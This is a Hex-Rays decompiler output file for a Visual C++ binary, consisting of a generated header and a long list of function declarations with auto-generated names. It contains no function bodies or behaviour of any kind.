/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 __fastcall sub_13F101000(); // weak
__int64 __fastcall sub_13F101030(); // weak
__int64 __fastcall sub_13F101060(); // weak
__int64 __fastcall sub_13F101070(); // weak
__int64 __fastcall sub_13F1010F0(); // weak
__int64 __fastcall sub_13F101170(); // weak
__int64 __fastcall sub_13F101210(); // weak
__int64 __fastcall sub_13F101280(); // weak
__int64 __fastcall sub_13F1012B0(); // weak
__int64 __fastcall sub_13F1012F0(); // weak
__int64 __fastcall sub_13F101330(); // weak
__int64 *sub_13F10133C();
uintptr_t sub_13F101358();
void sub_13F101370();
__int64 __fastcall sub_13F101380(); // weak
__int64 __fastcall sub_13F1013A0(); // weak
__int64 __fastcall sub_13F1013AC(); // weak
__int64 __fastcall sub_13F1013C4(); // weak
__int64 *sub_13F1013F0();
_QWORD *__fastcall sub_13F101400(_QWORD *, __int64);
const char *__fastcall sub_13F101460(__int64);
_QWORD *__fastcall sub_13F101480(_QWORD *, char);
signed __int64 __fastcall sub_13F1014D0(__int64);
__int64 __fastcall sub_13F1014E0(_QWORD *);
__int64 __fastcall sub_13F101560(__int64, int, const __m128i *);
__int64 __fastcall sub_13F1015B0(__int64);
_QWORD *__fastcall sub_13F1015C0(_QWORD *, char);
__int64 __fastcall sub_13F101600(__int64, const __m128i *);
__int64 __fastcall sub_13F101660(__int64, const __m128i *);
__int64 __fastcall sub_13F1016B0(__int64, const __m128i *);
void **__fastcall sub_13F101700(_QWORD *);
__int64 __fastcall sub_13F101710(__int64, const __m128i *, __int64, __int64);
__int64 __fastcall sub_13F101D10(const __m128i *, __int64, __int64);
_QWORD *__fastcall sub_13F101D80(_QWORD *, char);
_QWORD *__fastcall sub_13F101DB0(_QWORD *, char);
__int64 __fastcall sub_13F101DF0(__int64, const __m128i *);
__int64 __fastcall sub_13F101E80(__int64, const __m128i *);
__int64 __fastcall sub_13F101F00(__int64, const __m128i *);
void __noreturn sub_13F101F70();
__int64 __fastcall sub_13F101FC0(__int64, const __m128i *);
__m128i *__fastcall sub_13F102040(__int64, __m128i *);
__m128i *__fastcall sub_13F102080(__int64, __m128i *);
bool __fastcall sub_13F1020C0(__int64, unsigned __int64);
__int64 __fastcall sub_13F102140(__int64);
void __fastcall __noreturn sub_13F102170(__int64);
char sub_13F1021D0();
__int64 sub_13F1021E0();
__int64 __fastcall sub_13F1021F0(__int64 *, __int64);
__int64 __fastcall sub_13F102240(__int64 *, __int64, __int64, __int64);
__int64 __fastcall sub_13F1022E0(__int64 *, __int64);
__int64 __fastcall sub_13F102330(__int64 *, __int64, __int64, __int64);
__int64 __fastcall sub_13F1023D0(__int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F102420(__int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F102470(__int64);
__int64 __fastcall sub_13F102480(__int64, _QWORD *);
char sub_13F102490();
__int64 __fastcall sub_13F1024A0(__int64, __int64, __int64, __int64, char);
__int64 __fastcall guard_check_icall_nop(); // weak
__int64 sub_13F1024C0();
__int64 __fastcall sub_13F1024D0(_BYTE *);
__int64 __fastcall sub_13F102500(__int64);
void __noreturn sub_13F102530();
__int64 __fastcall sub_13F102580(__int64, const __m128i *);
__int64 __fastcall sub_13F1025D0(__int64);
void __noreturn sub_13F102630();
__int64 __fastcall sub_13F102680(__int64, const __m128i *);
__int64 __fastcall sub_13F102700(__int64, const __m128i *);
void __noreturn sub_13F102780();
__int64 __fastcall sub_13F1027D0(__int64);
__int64 __fastcall sub_13F102850(__int64);
__int64 __fastcall sub_13F1028D0(__int64);
__int64 __fastcall sub_13F102960(__int64);
__int64 __fastcall sub_13F1029F0(__int64);
unsigned __int64 __fastcall sub_13F102A00(_QWORD *);
__int64 __fastcall sub_13F102A50(__int64 *);
_BOOL8 __fastcall sub_13F102A60(__int64);
__int64 __fastcall sub_13F102A70(__int64, __int64, _QWORD *);
__int64 __fastcall sub_13F102A80(__int64, const __m128i *);
__int64 __fastcall sub_13F102CD0(__int64);
__int64 __fastcall sub_13F102D40(__int64, __int64);
__int64 __fastcall sub_13F102DC0(__int64, char);
__int64 __fastcall sub_13F102E60(__int64, const __m128i *);
unsigned __int64 __fastcall sub_13F102F00(_QWORD *);
__int64 __fastcall sub_13F102F80(_DWORD *, const __m128i *, __int64, int, char);
__int64 __fastcall sub_13F102FA0(_DWORD *, const __m128i *, __int64, int, char);
__int64 __fastcall sub_13F102FC0(__int64);
__int64 __fastcall sub_13F102FD0(__int64);
__int64 __fastcall sub_13F102FE0(__int64);
__int64 __fastcall sub_13F102FF0(__int64);
__int64 (__fastcall *__fastcall sub_13F103000(__int64))();
__int64 __fastcall sub_13F103030(__int64);
_QWORD *__fastcall sub_13F103040(_QWORD *, char);
unsigned __int64 __fastcall sub_13F103080(_QWORD *);
_QWORD *__fastcall sub_13F1030D0(_QWORD *, char);
__int64 __fastcall sub_13F103140(__int64);
unsigned __int64 __fastcall sub_13F103170(_QWORD *);
_QWORD *__fastcall sub_13F1031E0(_QWORD *, __int64, __int64);
_QWORD *__fastcall sub_13F103240(_QWORD *, char);
__int64 __fastcall sub_13F103280(__int64, char);
unsigned __int64 __fastcall sub_13F1032B0(_QWORD *);
void **__fastcall sub_13F103300(_QWORD *);
__int64 __fastcall sub_13F103340(__int64, __int64, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F103560(_QWORD *, char);
__int64 __fastcall sub_13F1035F0(__int64, __int64);
__int64 __fastcall sub_13F103680(__int64, __int64);
__int64 __fastcall sub_13F103710(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F103730(__int64, __int64);
unsigned __int64 __fastcall sub_13F103750(__int64, __int64, __int64, __int64, __int64, __int64, char);
bool __fastcall sub_13F1037B0(__int64, unsigned __int8 *);
__int64 (__fastcall **__fastcall sub_13F1037D0(_QWORD *))();
_QWORD *__fastcall sub_13F103840(_QWORD *, char);
char __fastcall sub_13F1038F0(__int64, __int64);
char __fastcall sub_13F103910(__int64, __int64 *);
_QWORD *__fastcall sub_13F103930(_QWORD *, char);
_QWORD *__fastcall sub_13F1039B0(_QWORD *, char);
__int64 __fastcall sub_13F103A20(__int64, __int64);
__int64 (__fastcall **__fastcall sub_13F103A40(__int64, __int64))();
__int64 __fastcall sub_13F103A50(__int64, __int64 *);
__int64 (__fastcall **__fastcall sub_13F103A60(__int64, __int64))();
_QWORD *__fastcall sub_13F103A80(__int64, _QWORD *);
_QWORD *__fastcall sub_13F103AA0(_QWORD *, char);
_QWORD *__fastcall sub_13F103B30(_QWORD *, char);
_QWORD *__fastcall sub_13F103BC0(_QWORD *, char);
_QWORD *__fastcall sub_13F103C80(_QWORD *, __int64);
unsigned __int64 __fastcall sub_13F103F20(_QWORD *);
void **__fastcall sub_13F103FB0(__int64);
void *__fastcall sub_13F103FE0(__int64 a1);
void *__fastcall sub_13F104070(__int64);
void *__fastcall sub_13F1040B0(__int64);
void **__fastcall sub_13F1040F0(__int64);
__int64 __fastcall sub_13F104120(__int64, __int64);
__int64 __fastcall sub_13F104140(__int64);
__int64 __fastcall sub_13F104170(); // weak
__int64 __fastcall sub_13F104180(__int64);
__int64 __fastcall sub_13F1041C0(__int64);
__int64 __fastcall sub_13F104200(__int64);
__int64 __fastcall sub_13F104210(__int64);
__int64 __fastcall sub_13F104250(__int64);
__int64 __fastcall sub_13F104290(__int64);
_QWORD *__fastcall sub_13F1042D0(__int64);
__int64 __fastcall sub_13F104340(_QWORD *);
__m128i *__fastcall sub_13F104380(__int64, __m128i *);
__int64 sub_13F1043C0();
unsigned __int64 __fastcall sub_13F1043D0(__int64 a1, unsigned __int64 a2);
__int64 __fastcall sub_13F104400(); // weak
__int64 __fastcall sub_13F104410(); // weak
__int64 __fastcall sub_13F104430(__int64);
__int64 (__fastcall **__fastcall sub_13F104460(__int64, __int64))();
__int64 __fastcall sub_13F1044A0(__int64);
__int64 __fastcall sub_13F1044D0(__int64 *);
_QWORD *sub_13F104530();
__int64 __fastcall sub_13F104550(); // weak
__int64 __fastcall sub_13F104610(); // weak
__int64 __fastcall sub_13F104620(__int64);
__m128i *__fastcall sub_13F104750(__int64, __m128i *);
__int64 __fastcall sub_13F104790(__int64);
__int64 __fastcall sub_13F1047A0(); // weak
__int64 __fastcall sub_13F1047B0(__int64);
void __fastcall sub_13F1047C0(__int64);
__int64 __fastcall sub_13F1047E0(__int64);
__int64 __fastcall sub_13F104810(__int64, unsigned __int64);
__int64 __fastcall sub_13F104850(__int64, __int64);
__int64 __fastcall sub_13F104890(_QWORD *);
__int64 __fastcall sub_13F104930(_QWORD *);
bool __fastcall sub_13F104A30(__int64, unsigned __int8 *);
__int64 __fastcall sub_13F104AA0(__int64);
__int64 __fastcall sub_13F104AB0(__int64);
bool __fastcall sub_13F104AC0(__int64);
__int64 __fastcall sub_13F104B00(__int64, char);
__int64 __fastcall sub_13F104B40(__int64, unsigned int *, char);
__int64 __fastcall sub_13F104B90(_QWORD *, __int64, char);
__int64 __fastcall sub_13F104BF0(__int64);
void __fastcall __noreturn sub_13F104C00(); // weak
__int64 __fastcall sub_13F104C20(__int64, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F104CA0(__int64, __int64);
__int64 __fastcall sub_13F104D10(__int64, __int64, unsigned __int8, int);
__int64 __fastcall sub_13F104DE0(__int64, unsigned __int8, unsigned int, char);
__int64 __fastcall sub_13F104E10(__int64, _QWORD *);
void __fastcall sub_13F104E60(__int64, const __m128i *, __int64, __int64);
__int64 __fastcall sub_13F104F60(__int64, __int64);
char __fastcall sub_13F104FA0(__int64, const __m128i *, __int64, _DWORD *);
__int64 __fastcall sub_13F105050(__int64, __int64);
char __fastcall sub_13F105090(__int64, const __m128i *, __int64, char *);
__int64 __fastcall sub_13F105140(__int64);
void __fastcall sub_13F105150(__int64, int);
void __fastcall __noreturn sub_13F105160(); // weak
__int64 __fastcall sub_13F105180(_QWORD *);
void __fastcall sub_13F1051C0(_QWORD *, __int64);
void __fastcall sub_13F105240(_QWORD *, const __m128i *, unsigned __int64);
void __fastcall sub_13F1052E0(_QWORD *);
void __fastcall sub_13F105320(__int64 *);
__int64 __fastcall sub_13F105350(__int64 *);
__m128i *__fastcall sub_13F1053B0(__m128i *, const __m128i *);
__m128i **__fastcall sub_13F1053F0(__m128i **, const __m128i *);
_QWORD *__fastcall sub_13F1054C0(_QWORD *, char);
_QWORD *__fastcall sub_13F105500(_QWORD *);
_QWORD *__fastcall sub_13F1055F0(_QWORD *);
__int64 __fastcall sub_13F1057D0(__int64);
__int64 __fastcall sub_13F105870(__int64);
__int64 __fastcall sub_13F1058A0(__int64);
__int64 __fastcall sub_13F1058D0(__int64, const __m128i *);
_QWORD *__fastcall sub_13F105950(_QWORD *, char);
__int64 __fastcall sub_13F105990(__int64, const __m128i *);
__int64 __fastcall sub_13F105A10(__int64, const __m128i *);
void **__fastcall sub_13F105A90(_QWORD *);
void **__fastcall sub_13F105B40(_QWORD *);
__int64 __fastcall sub_13F105D20(__int64, char);
__int64 __fastcall sub_13F105D80(__int64, char);
__int64 __fastcall sub_13F105DE0(__int64, char);
__int64 __fastcall sub_13F105E10(__int64, char);
__int64 __fastcall sub_13F105E90(__int64);
__int64 __fastcall sub_13F105EF0(__int64, char);
__int64 __fastcall sub_13F105FC0(__int64, __int64);
__int64 __fastcall sub_13F106050(__int64, char);
_QWORD *__fastcall sub_13F1060F0(_QWORD *, int);
_QWORD *__fastcall sub_13F1061A0(_QWORD *, int);
__int64 __fastcall sub_13F106340(__int64, __int64);
_QWORD *__fastcall sub_13F106470(_QWORD *, char);
_QWORD *__fastcall sub_13F1064B0(_QWORD *, char);
__m128i *__fastcall sub_13F106500(__m128i *a1, _QWORD *a2);
__int64 __fastcall sub_13F106580(__int64);
__int64 __fastcall sub_13F1068B0(__int64);
__int64 __fastcall sub_13F1068C0(_QWORD *);
__int64 __fastcall sub_13F106970(__int64);
__int64 __fastcall sub_13F106A40(__int64);
_QWORD *__fastcall sub_13F106B10(_QWORD *, _QWORD *);
void __fastcall sub_13F106B80(__m128i *, unsigned __int64);
__m128i *__fastcall sub_13F106C30(__m128i *, const __m128i *);
__m128i *__fastcall sub_13F106C50(__m128i *, const __m128i *, unsigned __int64);
__m128i *__fastcall sub_13F106DB0(__m128i *, const __m128i *, unsigned __int64);
void __fastcall sub_13F106E40(__m128i **, const __m128i *);
unsigned __int64 __fastcall sub_13F106F10(__int64, unsigned __int64);
__int64 __fastcall sub_13F106F90(__int64, __int64, __int64);
__int64 __fastcall sub_13F106FE0(__int64);
__int64 __fastcall sub_13F1073C0(unsigned __int64);
__m128i *__fastcall sub_13F107420(__m128i *, __m128i *, const __m128i *);
__m128i *__fastcall sub_13F107480(__m128i *, __m128i *, __m128i *);
void __fastcall sub_13F107600(void (__fastcall ****)(_QWORD, __int64));
__int64 __fastcall sub_13F107650(__int64, __int64, __int64, unsigned __int8);
__int64 __fastcall sub_13F107780(__int64, __int64, _DWORD *);
__int64 sub_13F107870();
__int64 __fastcall sub_13F107960(_DWORD *, __int64);
__m128i *__fastcall sub_13F107980(__m128i *, unsigned __int64);
__m128i *__fastcall sub_13F107AD0(__m128i *, unsigned __int64, __int64, const __m128i *, unsigned __int64);
void __noreturn sub_13F107C60();
__m128i *__fastcall sub_13F107C80(__m128i *, unsigned __int64, const __m128i *, unsigned __int64);
void __noreturn sub_13F107D90();
__int64 __fastcall sub_13F107DB0(__int64, __int64, __int64, unsigned __int8);
__m128i *__fastcall sub_13F107EB0(__m128i *, unsigned __int64, __int64, unsigned __int64, const __m128i *, unsigned __int64);
__m128i *__fastcall sub_13F108070(__m128i *, unsigned __int64, unsigned __int64, const __m128i *, unsigned __int64);
__m128i *__fastcall sub_13F108210(__m128i *, unsigned __int64, __int64, unsigned __int64, __int64, const __m128i *, unsigned __int64);
_QWORD *__fastcall sub_13F1083E0(__int64, char);
_QWORD *__fastcall sub_13F1083EC(__int64, char);
__int64 sub_13F108530(_BYTE *, __int64, ...);
__int64 __fastcall sub_13F108590(__int64);
__int64 __fastcall sub_13F108A30(__int64, char);
__int64 __fastcall sub_13F109030(__int64);
__int64 sub_13F109250();
__int64 __fastcall sub_13F109700(_QWORD); // weak
_QWORD *__fastcall sub_13F109708(_QWORD *, __int64);
_QWORD *__fastcall sub_13F109748(_QWORD *);
_QWORD *__fastcall sub_13F109768(_QWORD *, __int64);
_QWORD *__fastcall sub_13F1097A8(_QWORD *, __int64);
_QWORD *__fastcall sub_13F1097F4(_QWORD *, __int64);
_QWORD *__fastcall sub_13F109834(_QWORD *, __int64);
_QWORD *__fastcall sub_13F109880(_QWORD *, __int64);
_QWORD *__fastcall sub_13F1098C0(_QWORD *, __int64);
_QWORD *__fastcall sub_13F109900(_QWORD *, __int64);
_QWORD *__fastcall sub_13F10994C(_QWORD *, __int64);
void __fastcall __noreturn sub_13F10998C(__int64);
void __fastcall __noreturn sub_13F1099B0(__int64);
__int64 __fastcall sub_13F1099D4(__int64, _QWORD *);
__int64 __fastcall sub_13F1099EC(__int64, __int128 *, const __m128i *);
__int64 __fastcall sub_13F109AE4(__int64, __int64);
__int64 __fastcall sub_13F109B38(__int64, __int64);
_QWORD *__fastcall sub_13F109B94(_QWORD *, int, __int64, const __m128i *);
__int64 __fastcall sub_13F109C80(__int64, char);
_QWORD *__fastcall sub_13F109CA4(_QWORD *, char);
__m128i *__fastcall sub_13F109CE8(__m128i *, unsigned int *, __m128i *);
void __fastcall sub_13F109DF8(int);
void __fastcall __noreturn sub_13F109E34(int);
__int64 __fastcall sub_13F109E7C(__int64, __int64, int);
bool __fastcall sub_13F109E88(__int64, __int64, int);
bool __fastcall sub_13F109EA4(__int64, unsigned int, __int64);
__int64 *sub_13F109EE8();
__m128i *__fastcall sub_13F109F1C(__int64, __m128i *, int);
const char *sub_13F109F54();
__int64 __fastcall sub_13F109F6C(_QWORD *);
void sub_13F109FE0();
__int64 __fastcall sub_13F10A01C(__int64, __m128i *);
char __fastcall sub_13F10A188(__int64);
bool __fastcall sub_13F10A194(__int64);
bool __fastcall sub_13F10A1AC();
char __fastcall sub_13F10A1C4(__int64 a1, int a2);
void __fastcall sub_13F10A1F4(__int64);
__int64 __fastcall sub_13F10A1FC(__int64);
__int64 __fastcall sub_13F10A210(__int64, int);
__int64 __fastcall sub_13F10A240(__int64);
__int64 __fastcall sub_13F10A248(__int64);
__int64 __fastcall sub_13F10A264(__int64);
__int64 __fastcall sub_13F10A28C(volatile signed __int64 *, unsigned int (__fastcall *)(volatile signed __int64 *, __int64, __int64), __int64);
const char *__fastcall sub_13F10A294(int);
__int64 __fastcall sub_13F10A2BC(__m128i *, __int64);
unsigned __int64 sub_13F10A38C();
__int64 __fastcall sub_13F10A3BC(__int64, unsigned int);
__int64 __fastcall sub_13F10A414(); // weak
__int64 (*sub_13F10A8FC())(void);
__int64 (*sub_13F10A91C())(void);
__int64 sub_13F10A93C();
__int64 __fastcall sub_13F10A978(__int64, __int64, __int64, __int64, int, int);
__int64 sub_13F10A9CC();
__int64 sub_13F10A9E8();
__int64 (*sub_13F10AA04())(void);
__int64 (*sub_13F10AA24())(void);
__int64 sub_13F10AA44();
__int64 sub_13F10AA60();
__int64 __fastcall sub_13F10AA80(); // weak
__int64 __fastcall sub_13F10AAAC(volatile signed __int64 *, unsigned int (__fastcall *)(volatile signed __int64 *, __int64, __int64), __int64, __int64);
__int64 sub_13F10AB90();
__int64 (*sub_13F10ABF0())(void);
__int64 (*sub_13F10AC10())(void);
__int64 sub_13F10AC30();
__int64 sub_13F10AC48();
__int64 sub_13F10AC68();
__int64 (*sub_13F10AC80())(void);
unsigned __int64 __fastcall sub_13F10ACD0(__int64, int *, char, unsigned int, unsigned int);
__int64 __fastcall sub_13F10AE80(__int64 *, const __m128i *, __int32 *);
unsigned __int64 __fastcall sub_13F10AF90(__int64, unsigned __int64);
_QWORD *__fastcall sub_13F10B0B0(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10B0E0(__int64);
__int64 __fastcall sub_13F10B1D0(__int64, __int64, char);
__int64 __fastcall sub_13F10B240(__int64, __int64);
__int64 __fastcall sub_13F10B300(__int64, __int64, char);
_QWORD *__fastcall sub_13F10B360(_QWORD *, __int64);
_QWORD *__fastcall sub_13F10B520(_QWORD *, __int64);
__int64 (__fastcall **__fastcall sub_13F10B560(__int64))();
__int64 __fastcall sub_13F10B5E0(__int64);
__int64 __fastcall sub_13F10B638(__int64, char);
__int64 __fastcall sub_13F10B644(__int64, char);
__int64 __fastcall sub_13F10B660(__int64, char);
__int64 __fastcall sub_13F10B6A0(__int64, char);
__int64 __fastcall sub_13F10B6E0(__int64, char);
bool __fastcall sub_13F10B710(_QWORD *);
__int64 (__fastcall **__fastcall sub_13F10B730(__int64, __int64))();
__int64 (__fastcall **__fastcall sub_13F10BB00(__int64, __int64))();
__int64 (__fastcall **__fastcall sub_13F10BEA0(__int64, __int64))();
void __noreturn sub_13F10BF50();
char __fastcall sub_13F10BF80(__int64);
__int64 (__fastcall **__fastcall sub_13F10BFD0(__int64, __int64 *))();
char __fastcall sub_13F10BFE0(__int64, unsigned __int64 *);
char __fastcall sub_13F10C090(__int64, unsigned __int64 *, _BYTE *);
__int64 __fastcall sub_13F10C150(__int64, __int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F10C180(__int64, __int64 *);
__int64 __fastcall sub_13F10C3E0(__int64, __int64 *);
__int64 __fastcall sub_13F10C780(__int64, __int64 *);
__int64 __fastcall sub_13F10CAA0(__int64 *);
unsigned __int64 __fastcall sub_13F10CAF0(__int64 *, __int64, unsigned __int64);
__int64 __fastcall sub_13F10CB70(__int64, __int64);
__int64 __fastcall sub_13F10CBB0(__int64 *, unsigned __int64);
__int64 (__fastcall **__fastcall sub_13F10CD00(__int64 *, __int64 *))();
char __fastcall sub_13F10CF80(__int64, char);
__int64 __fastcall sub_13F10D000(__int64);
void __fastcall sub_13F10D020(__int64);
__int64 __fastcall sub_13F10D070(__int64);
__int64 __fastcall sub_13F10D0F0(__int64, __int64, unsigned __int64 *);
__int64 __fastcall sub_13F10D160(__int64 *, __int64, __int64, __int64);
void __noreturn sub_13F10D1F0();
unsigned __int64 __fastcall sub_13F10D210(__int64, unsigned __int64);
void __fastcall sub_13F10D290(_QWORD *, unsigned __int64);
__int64 __fastcall sub_13F10D330(__m128i *, unsigned __int64, const __m128i *, unsigned __int64);
__int64 sub_13F10D3E0(_BYTE *, unsigned __int64, __int64, ...);
_QWORD *__fastcall sub_13F10D440(_QWORD *, const __m128i *);
_QWORD *__fastcall sub_13F10D470(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10D4A0(__int64);
unsigned __int64 __fastcall sub_13F10D580(_QWORD *);
unsigned __int64 __fastcall sub_13F10D5E0(_QWORD *);
_QWORD *__fastcall sub_13F10D760(_QWORD *, char);
_QWORD *__fastcall sub_13F10D7F0(_QWORD *, char);
__int64 __fastcall sub_13F10D830(__int64, __int64);
__int64 __fastcall sub_13F10D850(__int64);
__int64 __fastcall sub_13F10D860(_QWORD *, __int64, __int64, __int64, unsigned __int64, __int64, __int64);
__int64 __fastcall sub_13F10DB20(_QWORD *, __int64, __int64, unsigned __int64, __int64, __int64);
__int64 __fastcall sub_13F10DE10(_QWORD *, _QWORD *, const __m128i *, unsigned __int64);
void **__fastcall sub_13F10DFF0(_QWORD *, _QWORD *, __int64, __int64);
__int64 __fastcall sub_13F10E1C0(__int64);
unsigned __int64 __fastcall sub_13F10E240(__int64, __int64, __int64, __int64, __int64, __int64, __int64, char, unsigned int);
__int64 __fastcall sub_13F10E400(_QWORD *, __int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F10E550(_QWORD *, __int64, __int64, __int64);
__int64 __fastcall sub_13F10E7F0(_QWORD *, __int64);
_BOOL8 __fastcall sub_13F10E920(__int64 *, __int64, __int128 *, char, __int64, __int64);
__m128i *__fastcall sub_13F10EA10(__m128i *, const __m128i *, __m128i *);
__m128i *__fastcall sub_13F10EA70(__m128i *, unsigned int, unsigned int);
__m128i *__fastcall sub_13F10ECD0(__m128i *, unsigned __int64, __int64, __int8);
__int64 __fastcall sub_13F10EE30(__int64, char);
_QWORD *__fastcall sub_13F10EF10(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10EF40(__int64, const __m128i *);
_QWORD *__fastcall sub_13F10EF90(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10EFC0(__int64, const __m128i *, unsigned __int64);
_QWORD *__fastcall sub_13F10F3A0(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10F3D0(__int64, const __m128i *);
_QWORD *__fastcall sub_13F10F5B0(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F10F5E0(__int64, const __m128i *);
unsigned __int64 __fastcall sub_13F10F630(__int64);
__int64 __fastcall sub_13F10F66C(__int64, char);
_QWORD *__fastcall sub_13F10F678(__int64, char);
__int64 __fastcall sub_13F10F690(__int64, char);
_QWORD *__fastcall sub_13F10F6C0(_QWORD *, char);
_QWORD *__fastcall sub_13F10F760(_QWORD *, char);
unsigned __int64 __fastcall sub_13F10F800(__int64, const __m128i *, unsigned __int64, unsigned __int64, unsigned __int64, char);
__m128i *__fastcall sub_13F10F950(__int64, __m128i *);
__m128i *__fastcall sub_13F10F990(__int64, __m128i *);
char __fastcall sub_13F10F9D0(__int64 *);
char __fastcall sub_13F10FA20(__int64 *);
__int64 __fastcall sub_13F10FA70(__int64, __int64);
__int64 __fastcall sub_13F10FAF0(__int64 *, __int64, __int64);
__int64 __fastcall sub_13F10FB70(__int64 *, __int64, unsigned __int8, unsigned int, unsigned __int8);
__int64 __fastcall sub_13F10FC00(__int64 *, __int64, __int64, unsigned __int8);
__int64 __fastcall sub_13F10FC80(__int64, __int64, __int64, __int64, unsigned int, char);
__int64 __fastcall sub_13F10FD20(__int64 *, __int64, __int64, __int64, unsigned int, char);
__int64 __fastcall sub_13F10FD60(__int64, __int64, unsigned int, __int64);
__int64 __fastcall sub_13F10FDC0(__int64, __int64, __int64, __int64);
_QWORD *__fastcall sub_13F10FE90(__int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F10FF50(__int64 *, __int64);
__int64 __fastcall sub_13F10FFA0(__int64, __int64, __int64, unsigned __int8);
__int64 __fastcall sub_13F10FFB0(__int64);
void __noreturn sub_13F10FFD0();
__int64 __fastcall sub_13F110030(__int64, __int64, __int64);
__int64 __fastcall sub_13F1100A0(__int64);
unsigned __int64 __fastcall sub_13F1100C0(__int64, __int64, __int64, unsigned __int64);
__int64 __fastcall sub_13F1101C0(__int64, int, int);
__int64 __fastcall sub_13F110270(__int64 *, __int64);
__int64 __fastcall sub_13F1102D0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1103A0(__int64);
__int64 __fastcall sub_13F1103D0(__int64, __int64 *, __int64);
__int64 __fastcall sub_13F110410(__int64);
__int64 __fastcall sub_13F110450(__int64, __int64, __int64);
__int64 __fastcall sub_13F110490(__int64 *, unsigned __int16 *, int);
void __noreturn sub_13F110520();
__int64 __fastcall sub_13F110580(__int64);
void __noreturn sub_13F110590();
__int64 __fastcall sub_13F1105F0(__int64 *);
__int64 __fastcall sub_13F110670(__int64, __int64, unsigned __int8);
void ***sub_13F110680();
__int64 __fastcall sub_13F1107C0(__int64);
__int64 __fastcall sub_13F110860(__int64 *, __int64);
__int64 __fastcall sub_13F1108C0(__int64, __int64, __int64);
__int64 __fastcall sub_13F1109A0(__int64 *, _WORD *, int);
__int64 __fastcall sub_13F110A20(__int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F110C10(__int64, __int64, __int64, int, char);
__int64 __fastcall sub_13F110D80(_DWORD *, unsigned int, int, char);
__int64 __fastcall sub_13F110DD0(__int64, __int64, __int64, void (__fastcall ***)(_QWORD, __int64));
__int64 __fastcall sub_13F110E20(__int64, __int64, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F110EC0(__int64 *, __int64, unsigned __int64, __int64);
__int64 __fastcall sub_13F110F70(__int64, __int64);
__int64 __fastcall sub_13F110FC0(__int64, __int64, void (__fastcall ***)(_QWORD, __int64));
__int64 __fastcall sub_13F111010(__int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F1110A0(__int64, __int64, __int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F111150(__int64, __int64);
__int64 __fastcall sub_13F1111D0(__int64);
__int64 __fastcall sub_13F111240(__int64, unsigned int);
__int64 *sub_13F1112C0();
__int64 __fastcall sub_13F111340(__int64, unsigned __int64);
__int64 __fastcall sub_13F111450(__int64 *);
__int64 __fastcall sub_13F1114A0(__int64, __int64, __int64, char);
__int64 __fastcall sub_13F111680(__int64, __int64, unsigned int *, __int64, char);
_BOOL8 __fastcall sub_13F1117D0(__int64, const __m128i *, unsigned __int64);
__int64 __fastcall sub_13F111970(__int64, void (__fastcall ***)(_QWORD, __int64));
__int64 __fastcall sub_13F1119C0(__int64, __int64, __int64, __int64, __int64);
__int64 __fastcall sub_13F111A50(__int64, char);
_QWORD *__fastcall sub_13F111A90(_QWORD *, char);
char __fastcall sub_13F111AC0(__int64, const __m128i *, __int64, char *);
char __fastcall sub_13F111B40(__int64, const __m128i *, __int64, _QWORD *);
__int64 __fastcall sub_13F111BC0(__int64, __int64);
__int64 __fastcall sub_13F112010(__int64, __int64);
__int64 __fastcall sub_13F112050(__int64, _QWORD *);
__int64 __fastcall sub_13F112090(unsigned int *, unsigned int, unsigned int);
unsigned __int64 __fastcall sub_13F1121A0(unsigned __int64 *a1, unsigned __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_13F1122F0(__int64, __int64, __int64, _QWORD *);
__m128i *__fastcall sub_13F1124A0(__m128i *, unsigned __int64, unsigned __int64);
unsigned __int64 *__fastcall sub_13F112700(unsigned __int64 *, __int64);
unsigned __int64 *__fastcall sub_13F1127B0(unsigned __int64 *, unsigned __int64, _DWORD *);
_QWORD *__fastcall sub_13F112850(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F112880(__int64);
__int64 __fastcall sub_13F112960(__int64, __int64, unsigned __int64);
__int64 __fastcall sub_13F112A00(__int64, __int64);
__int64 __fastcall sub_13F112AD0(__int64, unsigned int);
_QWORD *__fastcall sub_13F112B70(_QWORD *, __int64, __int64, int, int);
__int64 __fastcall sub_13F112CF0(__int64);
__int64 __fastcall sub_13F112D70(__int64, __int64);
__int64 __fastcall sub_13F112E50(__int64, __int64);
__int64 __fastcall sub_13F112F30(__int64, __int64);
_QWORD *__fastcall sub_13F1130A0(_QWORD *, const __m128i *);
__int64 __fastcall sub_13F1130D0(__int64);
__int64 __fastcall sub_13F1131B0(__int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F1132A0(_QWORD *);
unsigned __int64 __fastcall sub_13F1132F0(_QWORD *);
unsigned __int64 __fastcall sub_13F113380(_QWORD *);
unsigned __int64 __fastcall sub_13F113450(_QWORD *);
__int64 __fastcall sub_13F113500(__int64, __int64);
__int64 __fastcall sub_13F1135A0(__int64, __int64, unsigned __int64);
bool __fastcall sub_13F113630(__int64);
__int64 __fastcall sub_13F113670(__int64);
__int64 __fastcall sub_13F113780(__int64);
__int64 __fastcall sub_13F113990(__int64, __int64, __int64);
_QWORD *__fastcall sub_13F113A30(_QWORD *, __int64, __int32);
__int64 __fastcall sub_13F113B00(__int64, __int64, __int64);
unsigned __int64 __fastcall sub_13F113C40(__int64 *, unsigned __int64);
unsigned __int64 __fastcall sub_13F113CE0(__int64 *, unsigned __int64);
bool __fastcall sub_13F113DA0(__int64, __int64);
